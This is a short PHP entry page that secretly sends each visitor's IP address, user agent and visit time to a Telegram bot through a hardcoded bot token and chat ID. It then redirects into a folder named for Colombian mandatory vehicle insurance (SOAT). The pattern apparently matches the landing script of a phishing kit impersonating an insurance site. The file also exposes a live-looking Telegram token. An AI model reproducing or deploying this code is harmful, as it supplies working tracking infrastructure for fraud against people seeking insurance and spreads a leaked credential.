<?php
$telegramToken = '8429161245:AAFncaI7nZrbyEiAh3ex7rvtFL0jACdzNG4';
$chatId = '-4917477088';

$messageParts = [];
$messageParts[] = 'Nuevo ingreso al sitio';
if (!empty($_SERVER['REMOTE_ADDR'])) { $messageParts[] = 'IP: ' . $_SERVER['REMOTE_ADDR']; }
if (!empty($_SERVER['HTTP_USER_AGENT'])) { $messageParts[] = 'UA: ' . substr($_SERVER['HTTP_USER_AGENT'], 0, 300); }
$messageParts[] = 'Fecha: ' . date('Y-m-d H:i:s');
$text = implode(' | ', $messageParts);
$url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
if (function_exists('curl_init')) {
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, ['chat_id' => $chatId, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => true]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
curl_setopt($ch, CURLOPT_TIMEOUT, 2);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
@curl_exec($ch);
curl_close($ch);
} else {
$context = stream_context_create([
'http' => [
'method' => 'POST',
'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
'content' => http_build_query(['chat_id' => $chatId, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => true]),
'timeout' => 2
]
]);
@file_get_contents($url, false, $context);
}
header('Location: ./soat/digital/seguro-obligatorio/');
exit;